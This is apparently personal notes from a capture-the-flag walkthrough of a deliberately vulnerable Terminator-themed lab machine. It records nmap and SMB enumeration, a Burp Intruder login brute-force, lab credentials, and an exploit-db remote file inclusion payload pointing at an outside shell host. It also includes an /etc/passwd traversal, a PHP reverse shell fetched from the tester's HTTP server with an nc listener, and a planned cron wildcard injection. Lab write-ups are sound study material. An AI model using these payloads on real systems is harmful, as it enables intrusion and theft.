> vulnerable Terminator themed Linux machine.

VICTIM IP = 10.10.159.28
MY IP = 10.10.127.189

# Nmap scans

`nmap -A 10.10.159.28`

```
PORT    STATE SERVICE     VERSION

22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (EdDSA)

80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet

110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL PIPELINING SASL CAPA AUTH-RESP-CODE RESP-CODES TOP

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 Pre-login OK more SASL-IR LOGIN-REFERRALS ENABLE have listed IDLE ID post-login capabilities LITERAL+ IMAP4rev1

445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

```

```
Host script results:
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2023-10-03T03:02:22-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-03 09:02:22
|_  start_date: 1600-12-31 23:58:45

```


`nmap -sV --script vuln 10.10.159.28`

```

80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=ip-10-10-159-28.eu-west-1.compute.internal
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://ip-10-10-159-28.eu-west-1.compute.internal:80/
|     Form id: 
|     Form action: #
|     
|     Path: http://ip-10-10-159-28.eu-west-1.compute.internal/#
|     Form id: 
|_    Form action: #
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /squirrelmail/src/login.php: squirrelmail version 1.4.23 [svn]
|_  /squirrelmail/images/sm_logo.png: SquirrelMail
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.


445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:5A:59:C4:1F:DB (Unknown)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_ 

```


# Samba enumeration

use this https://arnavtripathy98.medium.com/smb-enumeration-for-penetration-testing-e782a328bf1b

`nmap -sC -p 139,445 -sV 10.10.159.28`

```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:5A:59:C4:1F:DB (Unknown)
Service Info: Host: SKYNET

Host script results:
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2023-10-03T03:23:50-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-03 09:23:50
|_  start_date: 1600-12-31 23:58:45

```

Lets use smbmap
- Use `cd /opt/smbmap` to move in a desiderable location. THen launc it with `python3 smbmap.py -H 10.10.159.28`

```
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
                     https://github.com/ShawnDEvans/smbmap

                                                                                                    
[+] IP: 10.10.159.28:445	Name: ip-10-10-159-28.eu-west-1.compute.internalStatus: Guest session   	
        Disk                                 Permissions	Comment
	----                                     -----------	-------
	print$                                   NO ACCESS	Printer Drivers
	anonymous                                READ ONLY	Skynet Anonymous Share
	milesdyson                               NO ACCESS	Miles Dyson Personal Share
	IPC$                                     NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))

```

We got a possible username:

`	milesdyson      Disk      Miles Dyson Personal Share`

Than, we note that `anonymous` disk is readable so:
- using `smbclient \\\\10.10.159.28\\anonymous` and click enter (no password required) we can read all files
- use `get FILE` to download log1.txt (note that it is the only log file no empty)

This file contains a list of passwords.

# directory discovery

Using FFuF:

`ffuf -u http://10.10.159.28/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

or 

Using GoBuster:

`gobuster dir -u http://10.10.159.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

we find this directories:

```
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
/server-status (Status: 403)
```

The most interesting is http://10.10.159.28/squirrelmail/src/login.php. It is a login page and we can attack with INTRUDER (BURP SUITE) using user+password combination discover earlier:

![[Pasted image 20231003104513.png]]

So, now we can try the combination: `milesdyson:cyborg007haloterminator`, and we are in.

![[Pasted image 20231003104840.png]]

The first email is:

![[Pasted image 20231003110553.png]]

We got a password : `` )s{A&2Z=F^n_E.B` `` for this user for smb

To log in in smb as milesdyson user and access to his disk:  
`smbclient -U milesdyson \\\\10.10.159.28\\milesdyson`

Navigate to /note folder we discover an `important.txt` file. We can download it with `get` command and view/open it:

![[Pasted image 20231003111353.png]]

We found a new directory `/45kra24zxs28v3yd` --> http://10.10.159.28/45kra24zxs28v3yd/

![[Pasted image 20231003111553.png]]

Let's use gobuster again in this webpage:

`gobuster dir -u http://10.10.159.28/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

We found the `/administrator` page.

![[Pasted image 20231003111915.png]]

https://www.exploit-db.com/exploits/25971

```
#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

```


Create a PHP reverse shell using : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Start a python server: `python3 -m http.server` --> NOTE: it is on port 8000
Start a listener: `nc -lvnp 1234`

Launch the exploit with:
http://10.10.159.28/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.201.128:8000/rev_shell.php?

We got a reverse shell:

![[Pasted image 20231003114609.png]]

Using `cat /etc/crontab` we search for task which are repeated.

Inside /home/milesdyson/backups we find a file backup.sh and see that every minutes a script is being executed, we can perfom a wildcard injection.


